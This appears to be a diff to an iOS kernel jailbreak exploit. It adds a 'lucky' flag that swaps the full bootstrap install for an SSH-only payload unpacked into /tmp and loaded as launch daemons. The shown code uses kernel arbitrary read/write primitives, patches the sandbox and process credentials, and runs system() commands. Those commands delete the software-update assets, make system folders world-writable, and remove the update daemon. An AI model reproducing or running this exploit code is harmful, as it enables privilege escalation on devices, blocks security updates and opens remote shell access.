@@ -97,6 +97,8 @@ uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
 
 void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
 {
+    int lucky = 1;
+
     io_iterator_t iterator;
     IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"), &iterator);
     io_object_t servicex = IOIteratorNext(iterator);
@@ -739,7 +741,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         fref += 4;
     }
     
-    {
+    if (!lucky) {
         /*
          sandbox
          */
@@ -830,7 +832,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         WriteAnywhere32(v_mount + 0x71, v_flag & (~(0x1<<6)));
         
         char* nmz = strdup("/dev/disk0s1s1");
-        int lolr = mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
+        int lolr = lucky ? 666 : mount( "hfs", "/", MNT_UPDATE, (void*)&nmz);
         NSLog(@"remounting: %d", lolr);
         
         v_mount = ReadAnywhere64(rootfs_vnode+off);
@@ -851,7 +853,7 @@ remappage[remapcnt++] = (x & (~PMK));\
             
             int f = open("/.installed_yaluX", O_RDONLY);
             
-            if (f == -1) {
+            if (!lucky && f == -1) {
                 NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
                 NSString* bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
                 const char* jl = [tar UTF8String];
@@ -893,43 +895,72 @@ remappage[remapcnt++] = (x & (~PMK));\
                 [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                 system("killall -9 cfprefsd");
                 
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/usr/libexec/reload");
-                copyfile(jl, "/usr/libexec/reload", 0, COPYFILE_ALL);
-                chmod("/usr/libexec/reload", 0755);
-                chown("/usr/libexec/reload", 0, 0);
+            } else if (lucky) {
+                NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
+                NSString* bootstrap = [execpath stringByAppendingPathComponent:@"sshonly.tar"];
+                const char* jl = [tar UTF8String];
+                copyfile(jl, "/tmp/tar", 0, COPYFILE_ALL);
+                chmod("/tmp/tar", 0755);
+                jl="/tmp/tar";
                 
+                chdir("/tmp/");
+                
+                chmod(jl, 0755);
+                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL}, NULL);
+                NSLog(@"pid = %x", pd);
+                waitpid(pd, 0, 0);
+                
+                
+                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
+                jl = [jlaunchctl UTF8String];
+                copyfile(jl, "/tmp/bin/launchctl", 0, COPYFILE_ALL);
+                chmod("/tmp/bin/launchctl", 0755);
+                jl = "/tmp/bin/launchctl";
+                
+                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "load", "/tmp/Library/LaunchDaemons", NULL}, NULL);
+                NSLog(@"pid = %x", pd);
+                waitpid(pd, 0, 0);
             }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/Library/LaunchDaemons/0.reload.plist");
-                copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
-                chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
-                chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
+            if (!lucky) {
+                {
+                    NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
+                    char* jl = [jlaunchctl UTF8String];
+                    unlink("/usr/libexec/reload");
+                    copyfile(jl, "/usr/libexec/reload", 0, COPYFILE_ALL);
+                    chmod("/usr/libexec/reload", 0755);
+                    chown("/usr/libexec/reload", 0, 0);
+                    
+                }
+                {
+                    NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
+                    char* jl = [jlaunchctl UTF8String];
+                    unlink("/Library/LaunchDaemons/0.reload.plist");
+                    copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
+                    chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
+                    chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
+                }
+                {
+                    NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
+                    char* jl = [jlaunchctl UTF8String];
+                    unlink("/Library/LaunchDaemons/dropbear.plist");
+                    copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
+                    chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
+                    chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
+                }
+                unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
             }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
-                char* jl = [jlaunchctl UTF8String];
-                unlink("/Library/LaunchDaemons/dropbear.plist");
-                copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
-                chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
-                chown("/Library/LaunchDaemons/dropbear.plist", 0, 0);
-            }
-            unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
             
         }
     }
-    chmod("/private", 0777);
-    chmod("/private/var", 0777);
-    chmod("/private/var/mobile", 0777);
-    chmod("/private/var/mobile/Library", 0777);
-    chmod("/private/var/mobile/Library/Preferences", 0777);
-    system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
-    system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
+    if (!lucky) {
+        chmod("/private", 0777);
+        chmod("/private/var", 0777);
+        chmod("/private/var/mobile", 0777);
+        chmod("/private/var/mobile/Library", 0777);
+        chmod("/private/var/mobile/Library/Preferences", 0777);
+        system("rm -rf /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; touch /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chmod 000 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate; chown 0:0 /var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
+        system("(echo 'really jailbroken'; /bin/launchctl load /Library/LaunchDaemons/0.reload.plist)&");
+    }
     WriteAnywhere64(bsd_task+0x100, orig_cred);
     sleep(2);
     
